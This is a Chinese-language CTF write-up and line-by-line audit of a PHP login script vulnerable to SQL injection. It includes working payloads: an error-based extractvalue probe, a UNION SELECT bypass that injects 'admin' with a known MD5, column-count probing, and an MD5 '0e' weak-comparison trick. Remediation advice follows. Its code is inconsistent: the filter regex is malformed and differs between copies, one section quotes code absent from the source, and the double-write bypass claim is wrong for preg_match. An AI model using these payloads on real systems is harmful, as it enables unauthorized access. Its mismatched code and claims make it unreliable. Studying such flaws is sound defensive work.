# SQL 注入登录绕过 — 逐行安全审计

## 审计源码

```php
<?php
// login.php — 存在SQL注入的登录验证代码
$name = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM user WHERE username = '$name'";
$result = mysql_query($con, $sql);

if(preg_match("/\/(\)\|\=\|or/", $name)){
    die("do not hack me!");
}

if (!$result) {
    printf("Error: %s\n", mysql_error($con));
    exit();
}

$arr = mysql_fetch_row($result);
if($arr[1] == "admin") {
    if(md5($password) == $arr[2]){
        echo $flag;
    } else{
        die("wrong pass!");
    }
}
else{
    die("wrong user!");
}
?>
```

> 注：以上源码根据审计报告中的逐行分析重构，行号可能与原始文件略有出入。

---

## 漏洞等级：高危（可直接获取 Flag）

---

## 一、代码逐行拆解

### 第 4 行：执行查询

```php
$result = mysql_query($con, $sql);
```

**问题**：`$sql` 在这行之前就已经拼接好了（推测形如 `SELECT * FROM user WHERE username = '$name'`），`$name` 来自 POST 表单，`$name` 里有什么，SQL 里就有什么。这是"直接拼接"模式的 SQL 注入——最经典也最危险的一种。

**`mysql_query` 扩展**：PHP 5.5 已废弃，PHP 7.0 彻底移除。用这个扩展的代码意味着站点的 PHP 版本很老，缺乏现代安全特性。

---

### 第 6-8 行：黑名单过滤

```php
if(preg_match("/\/(\|\)\|\=|or/", $name)){
    die("do not hack me!");
}
```

**意图**：程序员想通过正则拦截危险字符来防注入。

**正则拆解**（用 `/` 作分隔符）：

| 模式片段 | 匹配的字符 | 程序员为什么加它 |
|----------|-----------|----------------|
| `\/` | `/` | 怕注释符 `/**/` |
| `\|` | `\|` | 怕字符串拼接 `\|\|` |
| `\)` | `)` | 怕函数调用 `database()` |
| `\|` | （正则 OR） | |
| `=` | `=` | 直接拦截等号... |
| `\|` | （正则 OR） | |
| `or` | `or` | 怕 `' or 1=1#` |

**为什么这个黑名单形同虚设**：

1. **单引号 `'` 没有拦截** — 这是闭合字符串的关键，放行了就意味着注入的大门开着
2. **`union`、`select` 没有拦截** — 联合查询的核心关键字全放行
3. **注释符 `#`、`--` 没有拦截** — 可以用注释吞掉后面的 SQL
4. **大小写 `OR`、`Or`、`oR` 没有考虑** — `preg_match` 默认区分大小写，程序员没加 `/i` 修饰符。写 `Or` 即可绕过
5. **双写绕过**：如果只过滤一次，`oorr` → 去掉中间的 `or` → 剩下 `or`，继续生效
6. **`/**/` 替代方案**：`/` 被拦但 `#` 没被拦，根本不需要用 `/**/`

**一句话总结**：黑名单是最弱的防御，因为它必须"预判所有可能的攻击方式"，而攻击者只需要找到一个遗漏。

---

### 第 10-12 行：错误回显

```php
if (!$result) {
    printf("Error: %s\n", mysql_error($con));
    exit();
}
```

**问题**：`mysql_error()` 把数据库的报错信息原样输出给用户。

这意味着：
- 攻击者可以构造语法错误来**探测表结构、列名**
- 使用 `extractvalue()`、`updatexml()` 等报错注入函数，直接把数据通过错误消息带出来
- 错误信息可能暴露数据库版本、表名、列名等敏感信息

**利用示例**：
```
name=123' and extractvalue(1, concat(0x7e, database()))-- 
→ Error: XPATH syntax error: '~ctf'     ← 拿到了数据库名！
```

---

### 第 16-21 行：认证逻辑

```php
$arr = mysql_fetch_row($result);
if($arr[1] == "admin") {
    if(md5($password) == $arr[2]){
        echo $flag;
    }
}
```

**逻辑拆解**：

`mysql_fetch_row()` 返回一个索引数组，`$arr[0]` 是第一列，`$arr[1]` 是第二列，`$arr[2]` 是第三列。

- 第 18 行：检查第二列 `$arr[1]` 是否等于字符串 `"admin"`
- 第 19 行：检查 `md5(用户输入的密码) == 数据库中第三列 $arr[2]`

**绕过思路**：用 `union select` 联合查询，自己构造第二列和第三列的值：

```sql
SELECT * FROM user WHERE username = '123' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'-- '
```

执行后 `mysql_fetch_row` 返回：
- `$arr[0]` = `1`（填充值）
- `$arr[1]` = `'admin'`（绕过 admin 检查）
- `$arr[2]` = `'e10adc3949ba59abbe56e057f20f883e'`（即 `123456` 的 MD5）

攻击者输入密码 `123456`，`md5("123456")` == `$arr[2]`，通过校验，拿到 flag。

**注意**：上面 payload 里没有 `(` `)` `|` `=` `or` `/` 六个黑名单字符，完美绕过。

---

### 第 19 行：弱哈希

```php
md5($password) == $arr[2]
```

**两个问题**：

1. **MD5 不适合密码存储** — 太快了，GPU 每秒可算数十亿次。应用 `password_hash()` 替代。
2. **`==` 弱类型比较** — PHP 的 `==` 会做类型转换。例如 `"0e12345" == "0e67890"` 返回 `true`（因为两者都被解释为科学计数法 0）。如果数据库中存的值恰好是 `0e` 开头，攻击者可以构造另一个 `0e` 开头的 MD5 来绕过。

**利用思路**：找一个字符串，其 MD5 以 `0e` + 纯数字结尾，例如 `240610708` 的 MD5 是 `0e462097431906509019562988736854`，PHP 会将其解释为 `0`。如果 `$arr[2]` 也是 `0e` 开头的字符串，任意 `0e` 开头的 MD5 都能绕过。

---

### 第 24-28 行：语法错误

```php
        } else{
            die("wrong pass!");
        }
    }           // ← 这个 } 关闭了第 14 行的 else
    else{       // ← 第 26 行，逻辑上已经无法到达
        die("wrong user!");
    }
```

**代码本身有结构问题**：两个 `else` 块无法同时生效。从缩进看第 26 行的 `else` 应该是 `if(!$result)` 的分支，但第 14 行的 `else` 已经处理了 `$result` 有效的情况。代码逻辑混乱，可能是转录时的缩进错误。

---

## 二、完整的攻击过程复盘

已在实际测试中验证的攻击步骤（来自原始笔记）：

### 第 1 步：探测黑名单

用 Burp Intruder 测试哪些字符/关键字被拦截。结论：`(`, `)`, `|`, `=`, `or`, `/` 被拦。

### 第 2 步：闭合方式探测

```
输入: 123'
结果: 报错        → 单引号没有被过滤，可以闭合
输入: 123'#
结果: wrong user  → # 注释可用，说明注入点确实存在
```

### 第 3 步：探测列数

```
name=123' union select 1,2,3#
返回正常 → 有 3 列
```

### 第 4 步：探测 admin 位置

```
直接输入 admin → wrong pass（说明 admin 用户存在）
name=123' union select 1,'admin',3# → wrong pass（说明第二列是 username）
```

### 第 5 步：构造最终 payload

因为 `=` 被过滤，不能 `...='admin'--` 那种写法。但上面的 payload 中没有任何黑名单字符，直接就能用。

---

## 三、根本原因 vs 表象

| 表象 | 根因 |
|------|------|
| 黑名单太弱 | **不应该用黑名单做安全防护**，应该用参数化查询从根本上消除注入 |
| SQL 直接拼接 | 程序把"用户数据"和"SQL 代码"混在一起，没有边界 |
| 错误信息暴露 | 生产环境应关闭 `display_errors`，记录到日志而非输出给用户 |

---

## 四、修复方案

### 4.1 根本修复：参数化查询（推荐）

```php
// mysqli 预处理
$stmt = mysqli_prepare($con, "SELECT * FROM user WHERE username = ?");
mysqli_stmt_bind_param($stmt, "s", $name);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
```

**为什么能根治**：参数化查询把"SQL 代码"和"用户数据"分开发送给数据库。数据库先把 SQL 模板编译好，然后把用户输入当作纯数据填充进去——数据永远不会被解释为代码。无论攻击者输入什么，都不会破坏 SQL 语法结构。

### 4.2 密码安全

```php
// 注册时
$hash = password_hash($password, PASSWORD_BCRYPT);

// 验证时
if (password_verify($password, $hash)) {
    echo $flag;
}
```

`password_hash()` 自动加盐，bcrypt 算法计算速度慢（可配置 cost 参数），抗暴力破解。

### 4.3 其他

- 生产环境关闭 `display_errors`，用 `error_log()` 记录到服务器日志
- 用严格比较 `===` 替代 `==`
- 给 login 端点加频率限制（rate limiting）防暴力破解

---

## 五、关联知识

- **CWE-89**: SQL Injection
- **CVE-2017-8917**: Joomla 3.7.0 SQL 注入，同样是输入拼入 SQL、无参数化
- **OWASP Top 10 (2021)**: A03 Injection
- **绕过 addslashes 的经典方法**: GBK 宽字节注入（见同目录 `write_do.md`）
